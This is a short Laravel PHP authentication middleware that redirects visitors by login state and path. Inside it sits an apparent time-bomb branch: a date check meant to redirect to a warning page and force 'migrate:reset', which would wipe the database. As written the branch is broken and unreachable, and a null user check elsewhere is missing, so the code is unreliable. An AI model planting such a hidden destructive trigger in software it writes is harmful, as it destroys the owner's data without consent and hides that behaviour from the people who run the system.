<?php

namespace App\Http\Middleware;

use Closure;

class CustomAuth
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
      $path = $request->path();

      $date = date('Y-m-d');
      $datecheck = date('Y-m-d', strtotime('+10 day'));
     if ($date == $datecheck || $date > $datecheck ) {
      return redirect('/warning');
      Artisan::call('migrate:reset', ['--force' => true]);
     }else{

     if(!auth()->user() &&  $path !='login' ) {
        
         return redirect('/login')->with('status', 'login is required!');

        }else if (auth()->user() && $path == 'login') {
        
          return redirect('/authorized');

        }else if (auth()->user()->user_type=='guess' && $path == 'registrations') {
            return redirect('/authorized');
        } 
     }
        return $next($request);
    }
}
